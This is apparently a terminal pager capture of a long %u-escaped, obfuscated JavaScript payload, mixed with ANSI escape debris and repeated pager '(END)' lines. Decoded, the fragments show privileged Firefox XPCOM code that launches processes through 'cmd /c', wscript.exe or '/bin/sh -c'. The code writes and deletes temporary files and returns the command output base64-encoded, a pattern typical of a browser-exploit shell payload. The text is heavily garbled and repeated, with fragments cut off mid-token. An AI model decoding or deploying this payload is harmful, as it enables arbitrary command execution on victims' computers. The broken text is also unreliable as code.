874%u5422%u706d%u2244%u202c%u6f43%u706d%u6e6f%u6e65%u7374%u692e%u746e%u7265%u6166%u6563%u2e73%u736e%u4649%u6c69%u2965%u0a3b%u2020%u2020 %u2020%u2020%u2020%u736a%u7263%u7069%u4674%u6c69%u2e65%u7061%u6570%u646e%u2728%u736f%u4c34%u7459%u356f%u4864%u674d%u5177%u7250%u4350%u2 e6a%u736a%u2927%u0a3b%u2020%u2020%u2020%u2020%u2020%u6176%u2072%u7473%u6572%u6d61%u3d20%u4320%u6d6f%u6f70%u656e%u746e%u2e73%u6c63%u7361 %u6573%u5b73%u4022%u6f6d%u697a%u6c6c%u2e61%u726f%u2f67%u656e%u7774%u726f%u2f6b%u6173%u6566%u662d%u6c69%u2d65%u756f%u7074%u7475%u732d%u7 274%u6165%u3b6d%u2231%u0a5d%u2020%u2020%u2020%u2020%u2020%u2020%u632e%u6572%u7461%u4965%u736e%u6174%u636e%u2865%u6f43%u706d%u6e6f%u6e65 %u7374%u692e%u746e%u7265%u6166%u6563%u2e73%u736e%u4649%u6c69%u4f65%u7475%u7570%u5374%u7274%u6165%u296d%u0a3b%u2020%u2020%u2020%u2020%u2 020%u7473%u6572%u6d61%u692e%u696e%u2874%u736a%u7263%u7069%u4674%u6c69%u2c65%u3020%u3078%u2034%u207c%u7830%u3830%u7c20%u3020%u3278%u2c30 %u3020%u3636%u2c36%u3020%u3b29%u200a%u2020%u2020%u2020%u2020%u7320%u7274%u6165%u2e6d%u7277%u7469%u2865%u736a%u7263%u7069%u2c74%u6a20%u6 373%u6972%u7470%u6c2e%u6e65%u7467%u2968%u0a3b%u2020%u2020%u2020%u2020%u2020%u6669%u2820%u7473%u6572%u6d61%u6920%u736e%u6174%u636e%u6f65 %u2066%u6f43%u706d%u6e6f%u6e65%u7374%u692e%u746e%u7265%u6166%u6563%u2e73%u736e%u5349%u6661%u4f65%u7475%u7570%u5374%u7274%u6165%u296d%u7 b20%u200a%u2020%u2020%u2020%u2020%u2020%u7320%u7274%u6165%u2e6d%u6966%u696e%u6873%u2928%u0a3b%u2020%u2020%u2020%u2020%u2020%u207d%u6c65 %u6573%u7b20%u200a%u2020%u2020%u2020%u2020%u2020%u7320%u7274%u6165%u2e6d%u6c63%u736f%u2865%u3b29%u200a%u2020%u2020%u2020%u2020%u7d20%u2 00a%u2020%u2020%u2020%u7d20%u0a0a%u2020%u2020%u2020%u2020%u6176%u2072%u7473%u6f64%u7475%u6946%u656c%u3d20%u2220%u5279%u655a%u6462%u7064 %u3b22%u0a0a%u2020%u2020%u2020%u2020%u6176%u2072%u7473%u6f64%u7475%u3d20%u4320%u6d6f%u6f70%u656e%u746e%u2e73%u6c63%u7361%u6573%u5b73%u4 022%u6f6d%u697a%u6c6c%u2e61%u726f%u2f67%u6966%u656c%u642f%u7269%u6365%u6f74%u7972%u735f%u7265%u6976%u6563%u313b%u5d22%u200a%u2020%u2020 %u2020%u2020%u2e20%u6567%u5374%u7265%u6976%u6563%u4328%u6d6f%u6f70%u656e%u746e%u2e73%u6e69%u6574%u6672%u6361%u7365%u6e2e%u4973%u7250%u7 06f%u7265%u6974%u7365%u0a29%u2020%u2020%u2020%u2020%u2020%u672e%u7465%u2228%u6d54%u4470%u2c22%u4320%u6d6f%u6f70%u656e%u746e%u2e73%u6e69 %u6574%u6672%u6361%u7365%u6e2e%u4973%u6946%u656c%u3b29%u200a%u2020%u2020%u2020%u7320%u6474%u756f%u2e74%u7061%u6570%u646e%u7328%u6474%u7 56f%u4674%u6c69%u2965%u0a3b%u200a%u2020%u2020%u2020%u7620%u7261%u7320%u6568%u6c6c%u0a3b%u2020%u2020%u2020%u2020%u6d63%u2064%u203d%u6d63 %u2e64%u7274%u6d69%u2928%u0a3b%u2020%u2020%u2020%u2020%u6669%u2820%u6977%u646e%u776f%u2973%u7b20%u200a%u2020%u2020%u2020%u2020%u7320%u6 568%u6c6c%u3d20%u7320%u5068%u7461%u2b68%u2022%u2b22%u6d63%u3b64%u200a%u2020%u2020%u2020%u2020%u7320%u6568%u6c6c%u3d20%u7320%u5068%u7461 %u2b68%u2022%u2b22%u6873%u6c65%u2e6c%u6572%u6c70%u6361%u2865%u5c2f%u2f57%u2c67%u7320%u4568%u6373%u2b29%u2022%u223e%u732b%u6474%u756f%u2 e74%u6170%u6874%u222b%u3220%u263e%u2231%u0a3b%u2020%u2020%u2020%u2020%u2020%u6176%u2072%u3662%u2034%u203d%u7673%u7363%u622e%u6f74%u2861 %u6873%u6c65%u296c%u0a3b%u2020%u2020%u2020%u2020%u207d%u6c65%u6573%u7b20%u200a%u2020%u2020%u2020%u2020%u7320%u6568%u6c6c%u3d20%u7320%u5 068%u7461%u2b68%u2022%u2b22%u6d63%u2e64%u6572%u6c70%u6361%u2865%u5c2f%u2f57%u2c67%u7320%u4568%u6373%u3b29%u200a%u2020%u2020%u2020%u2020 %u7320%u6568%u6c6c%u3d20%u7320%u5068%u7461%u2b68%u2022%u2b22%u6873%u6c65%u2e6c%u6572%u6c70%u6361%u2865%u5c2f%u2f57%u2c67%u7320%u4568%u6 373%u2029%u202b%u2022%u223e%u732b%u6474%u756f%u2e74%u6170%u6874%u222b%u3220%u263e%u2231%u0a3b%u2020%u2020%u2020%u2020%u0a7d%u200a%u2020 %u2020%u2020%u7620%u7261%u7020%u6f72%u6563%u7373%u3d20%u4320%u6d6f%u6f70%u656e%u746e%u2e73%u6c63%u7361%u6573%u5b73%u4022%u6f6d%u697a%u6 c6c%u2e61%u726f%u2f67%u7270%u636f%u7365%u2f73%u7475%u6c69%u313b%u5d22%u200a%u2020%u2020%u2020%u2020%u2e20%u7263%u6165%u6574%u6e49%u7473 %u6e61%u6563%u4328%u6d6f%u6f70%u656e%u746e%u2e73%u6e69%u6574%u6672%u6361%u7365%u6e2e%u4973%u7250%u636f%u7365%u2973%u0a3b%u2020%u2020%u2 020%u2020%u6176%u2072%u6873%u3d20%u4320%u6d6f%u6f70%u656e%u746e%u2e73%u6c63%u7361%u6573%u5b73%u4022%u6f6d%u697a%u6c6c%u2e61%u726f%u2f67 :[K[K [KESCESC[K[[[K66[K~~[K%u6966%u656c%u6c2f%u636f%u6c61%u313b%u5d22%u200a%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u632e%u6572%u7461%u4965%u736e%u6 174%u636e%u2865%u6f43%u706d%u6e6f%u6e65%u7374%u692e%u746e%u7265%u6166%u6563%u2e73%u736e%u4c49%u636f%u6c61%u6946%u656c%u3b29%u0a0a%u2020 %u2020%u2020%u2020%u6669%u2820%u6977%u646e%u776f%u2973%u7b20%u200a%u2020%u2020%u2020%u2020%u7320%u2e68%u6e69%u7469%u6957%u6874%u6150%u6 874%u2228%u3a43%u5c5c%u6957%u646e%u776f%u5c73%u535c%u7379%u6574%u336d%u5c32%u775c%u6373%u6972%u7470%u652e%u6578%u2922%u0a3b%u2020%u2020 %u2020%u2020%u2020%u7270%u636f%u7365%u2e73%u6e69%u7469%u7328%u2968%u0a3b%u2020%u2020%u2020%u2020%u2020%u6176%u2072%u7261%u7367%u3d20%u5 b20%u736a%u7263%u7069%u4674%u6c69%u2e65%u6170%u6874%u202c%u3662%u5d34%u0a3b%u2020%u2020%u2020%u2020%u2020%u7270%u636f%u7365%u2e73%u7572 %u286e%u7274%u6575%u202c%u7261%u7367%u202c%u7261%u7367%u6c2e%u6e65%u7467%u2968%u0a3b%u2020%u2020%u2020%u2020%u2020%u736a%u7263%u7069%u4 674%u6c69%u2e65%u6572%u6f6d%u6576%u7428%u7572%u2965%u0a3b%u2020%u2020%u2020%u2020%u2020%u6573%u5474%u6d69%u6f65%u7475%u6628%u6e75%u7463 %u6f69%u286e%u7b29%u6263%u6628%u6c61%u6573%u202c%u6d63%u2b64%u5c22%u226e%u722b%u6165%u4664%u6c69%u2865%u7473%u6f64%u7475%u702e%u7461%u2 968%u3b29%u297d%u0a3b%u2020%u2020%u2020%u2020%u207d%u6c65%u6573%u7b20%u200a%u2020%u2020%u2020%u2020%u7320%u2e68%u6e69%u7469%u6957%u6874 %u6150%u6874%u2228%u622f%u6e69%u732f%u2268%u3b29%u200a%u2020%u2020%u2020%u2020%u7020%u6f72%u6563%u7373%u692e%u696e%u2874%u6873%u3b29%u2 00a%u2020%u2020%u2020%u2020%u7620%u7261%u6120%u6772%u2073%u203d%u225b%u632d%u2c22%u7320%u6568%u6c6c%u3b5d%u200a%u2020%u2020%u2020%u2020 %u7020%u6f72%u6563%u7373%u722e%u6e75%u7428%u7572%u2c65%u6120%u6772%u2c73%u6120%u6772%u2e73%u656c%u676e%u6874%u3b29%u200a%u2020%u2020%u2 020%u2020%u7320%u7465%u6954%u656d%u756f%u2874%u7566%u636e%u6974%u6e6f%u2928%u637b%u2862%u6166%u736c%u2c65%u7220%u6165%u4664%u6c69%u2865 %u7473%u6f64%u7475%u702e%u7461%u2968%u3b29%u297d%u0a3b%u2020%u2020%u2020%u2020%u0a7d%u2020%u2020%u2020%u3b7d%u200a%u2020%u0a20%u200a%u2 020%u2020%u2020%u7020%u6d75%u2e70%u7361%u6e79%u5263%u6165%u2864%u696c%u7473%u6e65%u7265%u202c%u756e%u6c6c%u3b29%u200a%u2020%u2020%u7d20 %u2829%u3b29%u0a0a
+[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K66[K~~[K[K[7m(END)[27m[K[K [KESCESC[K[[[K55[K~~[K[HM022%u6f6d%u697a%u6c6c%u2e61%u726f%u2f67%u6966%u656c%u642f%u7269%u6365%u6f74%u7972%u735f%u7265%u6976%u6563%u313b%u5d22%u200a%u2020%u2020[HM%u3b22%u0a0a%u2020%u2020%u2020%u2020%u6176%u2072%u7473%u6f64%u7475%u3d20%u4320%u6d6f%u6f70%u656e%u746e%u2e73%u6c63%u7361%u6573%u5b73%u4[HM00a%u2020%u2020%u2020%u7d20%u0a0a%u2020%u2020%u2020%u2020%u6176%u2072%u7473%u6f64%u7475%u6946%u656c%u3d20%u2220%u5279%u655a%u6462%u7064[HM%u6573%u7b20%u200a%u2020%u2020%u2020%u2020%u2020%u7320%u7274%u6165%u2e6d%u6c63%u736f%u2865%u3b29%u200a%u2020%u2020%u2020%u2020%u7d20%u2[HMb20%u200a%u2020%u2020%u2020%u2020%u2020%u7320%u7274%u6165%u2e6d%u6966%u696e%u6873%u2928%u0a3b%u2020%u2020%u2020%u2020%u2020%u207d%u6c65[HM%u2066%u6f43%u706d%u6e6f%u6e65%u7374%u692e%u746e%u7265%u6166%u6563%u2e73%u736e%u5349%u6661%u4f65%u7475%u7570%u5374%u7274%u6165%u296d%u7[HM373%u6972%u7470%u6c2e%u6e65%u7467%u2968%u0a3b%u2020%u2020%u2020%u2020%u2020%u6669%u2820%u7473%u6572%u6d61%u6920%u736e%u6174%u636e%u6f65[HM%u3020%u3636%u2c36%u3020%u3b29%u200a%u2020%u2020%u2020%u2020%u7320%u7274%u6165%u2e6d%u7277%u7469%u2865%u736a%u7263%u7069%u2c74%u6a20%u6[HM020%u7473%u6572%u6d61%u692e%u696e%u2874%u736a%u7263%u7069%u4674%u6c69%u2c65%u3020%u3078%u2034%u207c%u7830%u3830%u7c20%u3020%u3278%u2c30[HM%u7374%u692e%u746e%u7265%u6166%u6563%u2e73%u736e%u4649%u6c69%u4f65%u7475%u7570%u5374%u7274%u6165%u296d%u0a3b%u2020%u2020%u2020%u2020%u2[HM274%u6165%u3b6d%u2231%u0a5d%u2020%u2020%u2020%u2020%u2020%u2020%u632e%u6572%u7461%u4965%u736e%u6174%u636e%u2865%u6f43%u706d%u6e6f%u6e65[HM%u6573%u5b73%u4022%u6f6d%u697a%u6c6c%u2e61%u726f%u2f67%u656e%u7774%u726f%u2f6b%u6173%u6566%u662d%u6c69%u2d65%u756f%u7074%u7475%u732d%u7[HMe6a%u736a%u2927%u0a3b%u2020%u2020%u2020%u2020%u2020%u6176%u2072%u7473%u6572%u6d61%u3d20%u4320%u6d6f%u6f70%u656e%u746e%u2e73%u6c63%u7361[HM%u2020%u2020%u2020%u736a%u7263%u7069%u4674%u6c69%u2e65%u7061%u6570%u646e%u2728%u736f%u4c34%u7459%u356f%u4864%u674d%u5177%u7250%u4350%u2[HM874%u5422%u706d%u2244%u202c%u6f43%u706d%u6e6f%u6e65%u7374%u692e%u746e%u7265%u6166%u6563%u2e73%u736e%u4649%u6c69%u2965%u0a3b%u2020%u2020[HM%u7374%u692e%u746e%u7265%u6166%u6563%u2e73%u736e%u5049%u6f72%u6570%u7472%u6569%u2973%u200a%u2020%u2020%u2020%u2020%u2020%u2e20%u6567%u2[HMf79%u6573%u7672%u6369%u3b65%u2231%u0a5d%u2020%u2020%u2020%u2020%u2020%u2020%u672e%u7465%u6553%u7672%u6369%u2865%u6f43%u706d%u6e6f%u6e65[HM%u706d%u6e6f%u6e65%u7374%u632e%u616c%u7373%u7365%u225b%u6d40%u7a6f%u6c69%u616c%u6f2e%u6772%u662f%u6c69%u2f65%u6964%u6572%u7463%u726f%u5[HM873%u7345%u2063%u203d%u5c22%u245e%u2226%u0a3b%u2020%u2020%u2020%u2020%u2020%u6176%u2072%u736a%u7263%u7069%u4674%u6c69%u2065%u203d%u6f43[HM%u2973%u7b20%u200a%u2020%u2020%u2020%u2020%u7320%u5068%u7461%u2068%u203d%u6322%u646d%u2f20%u2263%u0a3b%u2020%u2020%u2020%u2020%u2020%u6[HM176%u2072%u6873%u6150%u6874%u3d20%u2220%u622f%u6e69%u732f%u2068%u632d%u3b22%u0a0a%u2020%u2020%u2020%u2020%u6669%u2820%u6977%u646e%u776f[HM%u2020%u2020%u7d20%u0a0a%u2020%u2020%u2020%u2020%u6176%u2072%u6873%u7345%u2063%u203d%u5c22%u245c%u2226%u0a3b%u2020%u2020%u2020%u2020%u6[HM22b%u6e5c%u2922%u203b%u297d%u0a3b%u2020%u2020%u2020%u2020%u2020%u0a7d%u200a%u2020%u2020%u2020%u2020%u7220%u7465%u7275%u3b6e%u200a%u2020[HM%u7320%u7465%u6954%u656d%u756f%u2874%u7566%u636e%u6974%u6e6f%u2928%u207b%u6263%u6628%u6c61%u6573%u202c%u6572%u5674%u6c61%u742b%u6761%u2[HM120%u6573%u746e%u2029%u0a7b%u2020%u2020%u2020%u2020%u2020%u2020%u6573%u746e%u3d20%u7420%u7572%u3b65%u200a%u2020%u2020%u2020%u2020%u2020[HM%u2020%u2020%u2020%u7973%u636e%u3d20%u6620%u6c61%u6573%u0a3b%u200a%u2020%u2020%u2020%u2020%u6920%u2066%u7228%u7465%u6156%u206c%u2626%u2[HM020%u2020%u7d20%u6320%u7461%u6863%u2820%u2965%u7b20%u7220%u7465%u6156%u206c%u203d%u2e65%u656d%u7373%u6761%u3b65%u7d20%u0a0a%u2020%u2020[HM%u2020%u6572%u5674%u6c61%u3d20%u4620%u6e75%u7463%u6f69%u286e%u736a%u315b%u295d%u632e%u6c61%u286c%u6874%u7369%u3b29%u200a%u2020%u2020%u2[HM26e%u3b29%u200a%u2020%u2020%u2020%u2020%u2020%u2020%u7d20%u200a%u2020%u2020%u2020%u2020%u2020%u7d20%u0a3b%u2020%u2020%u2020%u2020%u2020[HM%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u6c65%u6573%u2020%u2020%u2020%u6263%u6628%u6c61%u6573%u202c%u2b72%u6174%u2b67%u5c22%u2[HMd69%u6f65%u7475%u6628%u6e75%u7463%u6f69%u286e%u7b29%u6320%u2862%u6166%u736c%u2c65%u7220%u742b%u6761%u222b%u6e5c%u2922%u203b%u297d%u0a3b[HM%u2020%u2020%u6920%u2066%u7228%u2029%u0a7b%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u6669%u2820%u7973%u636e%u2029%u6573%u5474%u6[HM029%u6572%u7574%u6e72%u0a3b%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u6573%u746e%u3d20%u7420%u7572%u3b65%u200a%u2020%u2020%u2020%u2020[34;1H[K:[K[K [KESCESC[K[[[K55[K~~[K[HM%u2e73%u6573%u646e%u3d20%u6620%u6e75%u7463%u6f69%u286e%u2972%u0a7b%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u6669%u2820%u6573%u746e%u2[HM465%u6156%u206c%u203d%u756e%u6c6c%u0a3b%u200a%u2020%u2020%u2020%u2020%u7420%u7972%u7b20%u200a%u2020%u2020%u2020%u2020%u2020%u7420%u6968[HM%u200a%u2020%u2020%u2020%u2020%u7620%u7261%u7320%u6e65%u2074%u203d%u6166%u736c%u3b65%u200a%u2020%u2020%u2020%u2020%u7620%u7261%u7220%u7[HM020%u7620%u7261%u7320%u6e79%u2063%u203d%u7274%u6575%u203b%u2f20%u202a%u7661%u696f%u2064%u617a%u676c%u276f%u2073%u6572%u6361%u2068%u2f2a[HM%u2020%u2020%u2020%u2020%u2020%u6176%u2072%u6174%u2067%u203d%u5b22%u4a21%u5641%u5341%u5243%u5049%u5d54%u3b22%u200a%u2020%u2020%u2020%u2[HM952%u5450%u5d5c%u672f%u2e29%u7865%u6365%u6328%u646d%u742e%u6972%u286d%u2929%u0a3b%u2020%u2020%u2020%u2020%u6669%u2820%u736a%u2029%u0a7b[HM%u736a%u3d20%u2820%u5e2f%u735c%u5c2a%u4a5b%u5641%u5341%u5243%u5049%u5c54%u285d%u5c5b%u5c73%u5d53%u292a%u5b5c%u2f5c%u414a%u4156%u4353%u4[HMd20%u3b29%u200a%u2020%u2020%u2020%u2020%u7220%u7465%u7275%u3b6e%u200a%u2020%u2020%u2020%u7d20%u0a0a%u2020%u2020%u2020%u2020%u6176%u2072[HM%u6974%u6e6f%u2928%u207b%u6263%u2228%u6f43%u6d6d%u6e61%u2064%u7369%u6520%u706d%u7974%u7320%u7274%u6e69%u2067%u2728%u2927%u222e%u3b29%u7[HM972%u286d%u2e29%u656c%u676e%u6874%u3d20%u203d%u2930%u7b20%u200a%u2020%u2020%u2020%u2020%u7320%u7465%u6954%u656d%u756f%u2874%u7566%u636e[HM%u2062%u203d%u6263%u7c20%u207c%u6628%u6e75%u7463%u6f69%u286e%u7b29%u297d%u0a3b%u200a%u2020%u2020%u2020%u6920%u2066%u6328%u646d%u742e%u6[HM020%u2020%u6176%u2072%u7572%u436e%u646d%u3d20%u6620%u6e75%u7463%u6f69%u286e%u6d63%u2c64%u6320%u2962%u7b20%u200a%u2020%u2020%u2020%u6320[HM%u6568%u6c6c%u225c%u2929%u522e%u6e75%u6328%u646d%u202c%u2c30%u7420%u7572%u2965%u5c3b%u206e%u2020%u2220%u297d%u732e%u6372%u0a3b%u2020%u2[HM464%u7865%u2874%u3b29%u6e5c%u2020%u2020%u2020%u6e28%u7765%u4120%u7463%u7669%u5865%u624f%u656a%u7463%u5c28%u5722%u6353%u6972%u7470%u532e[HM%u6572%u6d61%u502e%u736f%u7469%u6f69%u3d6e%u3b30%u6e5c%u2020%u2020%u2020%u6176%u2072%u6d63%u2064%u203d%u7473%u6572%u6d61%u522e%u6165%u5[HM572%u6d61%u742e%u7079%u3d65%u3b32%u7320%u7274%u6165%u2e6d%u6843%u7261%u6553%u2074%u203d%u225c%u7375%u612d%u6373%u6969%u225c%u203b%u7473[HM%u646f%u5465%u7079%u6465%u6156%u756c%u2965%u5c3b%u206e%u2020%u2020%u7320%u7274%u6165%u2e6d%u6f50%u6973%u6974%u6e6f%u303d%u203b%u7473%u6[HM274%u6165%u2e6d%u7954%u6570%u313d%u203b%u7473%u6572%u6d61%u4f2e%u6570%u286e%u3b29%u7320%u7274%u6165%u2e6d%u7257%u7469%u2865%u6c65%u6e2e[HM%u7765%u4120%u7463%u7669%u5865%u624f%u656a%u7463%u5c28%u4122%u4f44%u4244%u532e%u7274%u6165%u5c6d%u2922%u5c3b%u206e%u2020%u2020%u7320%u7[HM436%u203b%u6f64%u2e6d%u7061%u6570%u646e%u6843%u6c69%u2864%u6c65%u3b29%u6e5c%u2020%u2020%u2020%u6176%u2072%u7473%u6572%u6d61%u3d20%u6e20[HM%u2020%u6520%u2e6c%u6164%u6174%u7954%u6570%u3d20%u5c20%u6222%u6e69%u622e%u7361%u3665%u5c34%u3b22%u6520%u2e6c%u6574%u7478%u3d20%u6220%u3[HM020%u7620%u7261%u6520%u206c%u3d20%u6420%u6d6f%u632e%u6572%u7461%u4565%u656c%u656d%u746e%u5c28%u7222%u6f6f%u5c74%u2922%u5c3b%u206e%u2020[HM%u7669%u5865%u624f%u656a%u7463%u5c28%u4d22%u5853%u4c4d%u2e32%u4f44%u444d%u636f%u6d75%u6e65%u2e74%u2e33%u5c30%u2922%u5c3b%u206e%u2020%u2[HM357%u7263%u7069%u2e74%u7261%u7567%u656d%u746e%u2873%u2930%u5c3b%u206e%u2020%u2020%u7620%u7261%u6420%u6d6f%u3d20%u6e20%u7765%u4120%u7463[HM%u2020%u7620%u7261%u6a20%u6373%u6972%u7470%u3d20%u2820%u227b%u7273%u2263%u223a%u6e5c%u2020%u2020%u2020%u6176%u2072%u3662%u2034%u203d%u5[HM472%u2228%u6572%u6f73%u7275%u6563%u2f3a%u672f%u6572%u6d2f%u646f%u6c75%u7365%u532f%u7265%u6976%u6563%u2e73%u736a%u226d%u3b29%u200a%u2020[HM%u2d3e%u2931%u0a3b%u2020%u2020%u2020%u6176%u2072%u7673%u7363%u3d20%u4320%u6d6f%u6f70%u656e%u746e%u2e73%u7475%u6c69%u2e73%u6d69%u6f70%u7[HM46e%u0a3b%u2020%u2020%u2020%u6176%u2072%u6977%u646e%u776f%u2073%u203d%u7528%u2e61%u6e69%u6564%u4f78%u2866%u5722%u6e69%u6f64%u7377%u2922[HM%u2e73%u6e69%u6574%u6672%u6361%u7365%u6e2e%u4973%u7448%u7074%u7250%u746f%u636f%u6c6f%u6148%u646e%u656c%u2972%u752e%u6573%u4172%u6567%u7[HMc6f%u313b%u6e3f%u6d61%u3d65%u7468%u7074%u5d22%u200a%u2020%u2020%u2020%u2e20%u6567%u5374%u7265%u6976%u6563%u4328%u6d6f%u6f70%u656e%u746e[HM%u6f70%u656e%u746e%u2e73%u6c63%u7361%u6573%u5b73%u4022%u6f6d%u697a%u6c6c%u2e61%u726f%u2f67%u656e%u7774%u726f%u2f6b%u7270%u746f%u636f%u6[HM465%u7275%u206e%u6974%u656d%u3b72%u200a%u2020%u2020%u7d20%u0a3b%u2020%u2020%u0a0a%u2020%u2020%u2020%u6176%u2072%u6175%u3d20%u4320%u6d6f[HM%u746e%u7265%u6166%u6563%u2e73%u736e%u5449%u6d69%u7265%u542e%u5059%u5f45%u4e4f%u5f45%u4853%u544f%u3b29%u200a%u2020%u2020%u2020%u7220%u7[34;1H[K:[K[K [KESCESC[K[[[K55[K~~[K[HM774%u7469%u4368%u6c61%u626c%u6361%u286b%u6e7b%u746f%u6669%u3a79%u6263%u2c7d%u6420%u6c65%u7961%u202c%u6f43%u706d%u6e6f%u6e65%u7374%u692e[HM%u6e65%u7374%u692e%u746e%u7265%u6166%u6563%u2e73%u736e%u5449%u6d69%u7265%u3b29%u200a%u2020%u2020%u2020%u7420%u6d69%u7265%u692e%u696e%u5[HM25b%u6d40%u7a6f%u6c69%u616c%u6f2e%u6772%u742f%u6d69%u7265%u313b%u5d22%u632e%u6572%u7461%u4965%u736e%u6174%u636e%u2865%u6f43%u706d%u6e6f[HM%u7961%u2029%u0a7b%u2020%u2020%u2020%u2020%u6176%u2072%u6974%u656d%u2072%u203d%u6f43%u706d%u6e6f%u6e65%u7374%u632e%u616c%u7373%u7365%u2[HM020%u2020%u2020%u200a%u2020%u2020%u7620%u7261%u7320%u7465%u6954%u656d%u756f%u2074%u203d%u7566%u636e%u6974%u6e6f%u6328%u2c62%u6420%u6c65[HM%u2020%u7d20%u6320%u7461%u6863%u2820%u2965%u7b20%u7220%u7465%u7275%u206e%u2222%u203b%u0a7d%u2020%u2020%u2020%u3b7d%u200a%u2020%u0a20%u2[HM453%u6972%u676e%u662e%u6f72%u436d%u6168%u4372%u646f%u2865%u4961%u6574%u296d%u203b%u297d%u6a2e%u696f%u286e%u2222%u3b29%u200a%u2020%u2020[HM%u2020%u6572%u7574%u6e72%u6120%u7272%u7961%u6d2e%u7061%u6628%u6e75%u7463%u6f69%u286e%u4961%u6574%u296d%u7b20%u7220%u7465%u7275%u206e%u7[HMf6c%u6573%u2928%u0a3b%u2020%u2020%u2020%u2020%u2020%u6966%u656c%u722e%u6d65%u766f%u2865%u7274%u6575%u3b29%u0a0a%u2020%u2020%u2020%u2020[HM%u6962%u616e%u7972%u7453%u6572%u6d61%u632e%u6f6c%u6573%u2928%u0a3b%u2020%u2020%u2020%u2020%u2020%u6966%u656c%u7453%u6572%u6d61%u632e%u6[HM942%u6574%u7241%u6172%u2879%u6966%u656c%u7453%u6572%u6d61%u612e%u6176%u6c69%u6261%u656c%u2928%u3b29%u0a0a%u2020%u2020%u2020%u2020%u2020[HM%u6d61%u3b29%u200a%u2020%u2020%u2020%u2020%u7620%u7261%u6120%u7272%u7961%u3d20%u6220%u6e69%u7261%u5379%u7274%u6165%u2e6d%u6572%u6461%u7[HM020%u2020%u2020%u2020%u2020%u6962%u616e%u7972%u7453%u6572%u6d61%u732e%u7465%u6e49%u7570%u5374%u7274%u6165%u286d%u6966%u656c%u7453%u6572[HM%u6d6f%u6f70%u656e%u746e%u2e73%u6e69%u6574%u6672%u6361%u7365%u6e2e%u4973%u6942%u616e%u7972%u6e49%u7570%u5374%u7274%u6165%u296d%u0a3b%u2[HM020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2e20%u7263%u6165%u6574%u6e49%u7473%u6e61%u6563%u4328[HM%u6c63%u7361%u6573%u5b73%u4022%u6f6d%u697a%u6c6c%u2e61%u726f%u2f67%u6962%u616e%u7972%u6e69%u7570%u7374%u7274%u6165%u3b6d%u2231%u0a5d%u2[HM573%u3b29%u0a0a%u2020%u2020%u2020%u2020%u2020%u6176%u2072%u6962%u616e%u7972%u7453%u6572%u6d61%u3d20%u4320%u6d6f%u6f70%u656e%u746e%u2e73[HM%u3b29%u200a%u2020%u2020%u2020%u2020%u6620%u6c69%u5365%u7274%u6165%u2e6d%u6e69%u7469%u6628%u6c69%u2c65%u3120%u202c%u2c30%u6620%u6c61%u6[HM174%u636e%u2865%u6f43%u706d%u6e6f%u6e65%u7374%u692e%u746e%u7265%u6166%u6563%u2e73%u736e%u4649%u6c69%u4965%u706e%u7475%u7453%u6572%u6d61[HM%u6d61%u313b%u5d22%u200a%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u2020%u632e%u6572%u7461%u4965%u736e%u6[HM32e%u616c%u7373%u7365%u225b%u6d40%u7a6f%u6c69%u616c%u6f2e%u6772%u6e2f%u7465%u6f77%u6b72%u662f%u6c69%u2d65%u6e69%u7570%u2d74%u7473%u6572[HM%u7461%u2968%u0a3b%u200a%u2020%u2020%u2020%u2020%u7620%u7261%u6620%u6c69%u5365%u7274%u6165%u206d%u203d%u6f43%u706d%u6e6f%u6e65%u7374%u6[HMe73%u736e%u4c49%u636f%u6c61%u6946%u656c%u3b29%u200a%u2020%u2020%u2020%u2020%u6620%u6c69%u2e65%u6e69%u7469%u6957%u6874%u6150%u6874%u7028[HM%u2020%u2020%u2020%u2020%u632e%u6572%u7461%u4965%u736e%u6174%u636e%u2865%u6f43%u706d%u6e6f%u6e65%u7374%u692e%u746e%u7265%u6166%u6563%u2[HM361%u6573%u5b73%u4022%u6f6d%u697a%u6c6c%u2e61%u726f%u2f67%u6966%u656c%u6c2f%u636f%u6c61%u313b%u5d22%u200a%u2020%u2020%u2020%u2020%u2020[HM%u2020%u2020%u7274%u2079%u0a7b%u2020%u2020%u2020%u2020%u2020%u6176%u2072%u6966%u656c%u3d20%u4320%u6d6f%u6f70%u656e%u746e%u2e73%u6c63%u7[HM020%u0a20%u2020%u2020%u2020%u6176%u2072%u6572%u6461%u6946%u656c%u3d20%u6620%u6e75%u7463%u6f69%u286e%u6170%u6874%u2029%u0a7b%u2020%u2020[HM%u2020%u7d20%u3b29%u200a%u2020%u2020%u2020%u2020%u7d20%u0a29%u2020%u2020%u2020%u2020%u3b7d%u0a0a%u2020%u2020%u2